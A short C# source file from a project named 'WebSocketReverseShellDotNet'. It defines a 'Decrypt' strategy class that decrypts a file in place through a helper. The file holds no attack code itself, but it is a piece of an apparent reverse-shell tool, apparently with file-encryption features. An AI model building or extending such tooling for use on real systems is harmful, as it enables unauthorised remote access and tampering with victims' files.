using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.encryption
{
    internal class Decrypt: EncryptionStrategy
    {
        public void ProcessFile(string path)
        {
            EncryptionUtil.DecryptFileInPlace(path);
        }
    }   
}
